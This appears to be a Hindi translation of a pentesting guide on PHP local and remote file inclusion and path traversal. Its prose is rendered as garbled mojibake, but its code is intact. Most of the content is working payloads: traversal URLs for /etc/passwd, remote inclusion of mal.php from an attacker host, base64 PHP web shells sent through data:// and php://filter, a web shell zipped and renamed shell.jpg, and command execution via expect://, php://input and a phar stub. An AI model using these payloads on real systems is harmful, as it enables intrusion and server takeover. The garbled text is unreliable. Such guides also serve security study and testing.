рдкреНрд░рдпреЛрдЧ рдФрд░ рддреНрд░реБрдЯрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдХреЛрдИ рднреА рдЬреА рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рддрдиреА рд╕рдЯреАрдХ рд╕рдВрдЦреНрдпрд╛ рдХреА `../` рд╕рд┐рдХреНрд╡реЗрдВрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдФрд░ рдлрд┐рд░ `/etc/passwd` рддрдХ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдХрд┐рд╕реА рднреА рдЬреЛрдбрд╝реА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдЬреИрд╕реЗ `.php`) рдХреЛ рдиреНрдпреВрдЯреНрд░рд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рдП рд▓реЗрдХрд┐рди рд╡рд╛рдВрдЫрд┐рдд рдкрде (`/etc/passwd`) рдЕрдЯреИрдХ рд░рд╣реЗред

- **рдПрдХ рдирдХрд▓реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рдирд╛**:
рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд╕рд╛рде рдкрде рд╢реБрд░реВ рдХрд░рдирд╛ (рдЬреИрд╕реЗ `a/`) рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрднреНрдпрд╛рд╕ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдПрдХ рд╕рд╛рд╡рдзрд╛рдирд┐рдХ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ рд╕рд░реНрд╡рд░ рдХреЗ рдкрде рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддрд░реНрдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдкрде рдХрдЯреМрддреА рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рд╕рд░реНрд╡рд░ рдХреЗ рдкрде рдкрд╛рд░реНрд╕рд┐рдВрдЧ рд╡реНрдпрд╡рд╣рд╛рд░ рдФрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╕рдВрд░рдЪрдирд╛ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рджреГрд╢реНрдп рдХреЛрдИ рднреА рд╡рд┐рднрд┐рдиреНрди рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдФрд░ рд╕рдмрд╕реЗ рдкреНрд░рднрд╛рд╡реА рд╡рд┐рдзрд┐ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдкрд░реАрдХреНрд╖рдг рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред

**рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ PHP 5.3 рдореЗрдВ рд╕реБрдзрд╛рд░рд╛ рдЧрдпрд╛ рдерд╛ред**

### **рдлрд╝рд┐рд▓реНрдЯрд░ рдмрд╛рдЗрдкрд╛рд╕ рдЯреНрд░рд┐рдХреНрд╕**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## рд░рд┐рдореЛрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

PHP рдореЗрдВ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`allow_url_include`** **рдмрдВрдж** рд╣реИред рдпрд╣ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ **рдЪрд╛рд▓реВ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ PHP рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **`allow_url_include`** **On** рд╣реИ, рд▓реЗрдХрд┐рди PHP рдмрд╛рд╣рд░реА рд╡реЗрдмрдкреЗрдЬреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд░ рд░рд╣рд╛ рд╣реИ, [рдЗрд╕ рдкреЛрд╕реНрдЯ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдмреЗрд╕64 рдХреЛ рдбрд┐рдХреЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреА64 PHP рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ, рдЕрдВрддрд┐рдо `+.txt` рдЗрд╕рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рдЬреЛ `.txt` рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЙрд╕рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИ рдФрд░ b64 рдбрд┐рдХреЛрдб рдХреЗ рдмрд╛рдж рд╡рд╣ рднрд╛рдЧ рдХреЗрд╡рд▓ рдХрдЪрд░рд╛ рд▓реМрдЯрд╛рдПрдЧрд╛ рдФрд░ рдЕрд╕рд▓реА PHP рдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ (рдФрд░ рдЗрд╕рд▓рд┐рдП, рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдЧрд╛)ред
{% endhint %}

**`php://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рддреЗ рд╣реБрдП** рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python рдореВрд▓ рддрддреНрд╡

Python рдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреЗ рдХреЛрдб рдореЗрдВ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **`file_name`** рдореЗрдВ **рдкреВрд░реНрдг рдкрде** рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ **рдкрд┐рдЫрд▓рд╛ рдкрде рдХреЗрд╡рд▓ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
рдпрд╣ рдЗрдЪреНрдЫрд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://docs.python.org/3.10/library/os.path.html#os.path.join) рдХреЗ рдЕрдиреБрд╕рд╛рд░:

> рдпрджрд┐ рдХреЛрдИ рдШрдЯрдХ рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рд╣реИ, рддреЛ рд╕рднреА рдкрд┐рдЫрд▓реЗ рдШрдЯрдХ рдЫреЛрдбрд╝ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдЬреЛрдбрд╝рдирд╛ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рдШрдЯрдХ рд╕реЗ рдЬрд╛рд░реА рд░рд╣рддрд╛ рд╣реИред

## рдЬрд╛рд╡рд╛ рд╕реВрдЪреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЬрд╛рд╡рд╛ рдореЗрдВ рдПрдХ рдкрде рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рд╣реИ рдФрд░ рдЖрдк **рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВ** рдмрдЬрд╛рдп рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ, рддреЛ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рд╡рд╛рдкрд╕ рд▓реМрдЯрд╛рдИ рдЬрд╛рдПрдЧреА**ред рдпрд╣ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдореБрдЭреЗ рдкрддрд╛ рд╣реИ)ред

## рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░

рдпрд╣рд╛рдБ рдПрдХ рдРрд╕реА рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рд╕реВрдЪреА рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ ([рд▓рд┐рдВрдХ](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI рдХрд╛ рдЙрдкрдпреЛрдЧ PHP wrappers рдФрд░ protocols рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ

### php://filter

PHP рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдбреЗрдЯрд╛ рдкрд░ **рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрд╢реЛрдзрди рдХрд╛рд░реНрдпреЛрдВ** рдХреЛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдкрд╣рд▓реЗ рдЬрдм рдпрд╣ рдкрдврд╝рд╛ рдпрд╛ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ 5 рд╢реНрд░реЗрдгрд┐рдпрд╛рдБ рд╣реИрдВ:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: рдбреЗрдЯрд╛ рд╕реЗ рдЯреИрдЧ рд╣рдЯрд╛рдПрдВ ("<" рдФрд░ ">" рд╡рд╛рд▓реЗ рд╡рд╕реНрддреБрдУрдВ рдХреЛ)
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╝рд┐рд▓реНрдЯрд░ PHP рдХреЗ рдЖрдзреБрдирд┐рдХ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╕реЗ рдЧрд╛рдпрдм рд╣реЛ рдЧрдпрд╛ рд╣реИ
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : рдПрдХ рд╡рд┐рднрд┐рдиреНрди encoding рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИ (`convert.iconv.<input_enc>.<output_enc>`)ред рд╕рдорд░реНрдерд┐рдд рд╕рднреА encodings рдХреА **рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрдВрд╕реЛрд▓ рдореЗрдВ рдЪрд▓рд╛рдПрдВ: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` рдкрд░рд┐рд╡рд░реНрддрди рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдХрд▓реНрдкрд┐рдд рдкрд╛рда** рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд▓реНрдкрд┐рдд рдкрд╛рда рд▓рд┐рдЦрдиреЗ рдпрд╛ рдХрд▓реНрдкрд┐рдд рдкрд╛рда рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)ред
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдВрдХреБрдЪрд┐рдд рдХрд░реЗрдВ (рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╣реБрдд рд╕рд╛рд░рд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА)
* `zlib.inflate`: рдбреЗрдЯрд╛ рдХреЛ рдЕрдирд╕рдВрдХреБрдЪрд┐рдд рдХрд░реЗрдВ
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : рдкреБрд░рд╛рдирд╛
* `mdecrypt.*` : рдкреБрд░рд╛рдирд╛
* рдЕрдиреНрдп рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕
* php рдореЗрдВ `var_dump(stream_get_filters());` рдЪрд▓рд╛рдХрд░ рдЖрдк рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* `consumed`
* `dechunk`: HTTP chunked encoding рдХреЛ рдЙрд▓реНрдЯрд╛ рдХрд░рддрд╛ рд╣реИ
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,┬гhellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
рднрд╛рдЧ "php://filter" case insensitive рд╣реИ
{% endhint %}

### php://fd

рдпрд╣ wrapper рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реЗ рдЧрдП рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЦреЛрд▓реА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
рдЖрдк **php://stdin, php://stdout рдФрд░ php://stderr** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ 0, 1 рдФрд░ 2** рдХреЛ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдХреИрд╕реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ рд╣реИ)

### zip:// рдФрд░ rar://

рдПрдХ Zip рдпрд╛ Rar рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHPShell рд╣реЛ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред\
рд░рд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдХреНрд░рд┐рдп** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### рдбреЗрдЯрд╛://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ php рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИ** `allow_url_open` **рдФрд░** `allow_url_include`**

### expect://

Expect рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### рдЗрдирдкреБрдЯ://

POST рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЕрдкрдирд╛ рдкреЗрдпрд▓реЛрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

рдПрдХ `.phar` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдлрд╝рд╛рдЗрд▓ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП `include` рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП PHP рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдореЗрдВ `.phar` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
php --define phar.readonly=0 create_path.php
```
рдЬрдм рдПрдХреНрдпреВрд╢рди рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд╛рдордХ `test.phar` рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА, рдЬрд┐рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ LFI рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ PHP рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, рдпрд╛ `filesize()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рддреЛ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╡рдВрд╢реАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рднреНрд░рд╛рдВрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `phar` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

`.phar` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рднреНрд░рд╛рдВрддрд┐рдпреЛрдВ рдХрд╛ рд╢реЛрдзрди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВ:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### рдЕрдзрд┐рдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд [**рдпрд╣рд╛рдБ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](https://www.php.net/manual/en/wrappers.php)** рдкреНрд░реЛрдЯреЛрдХреЙрд▓:**

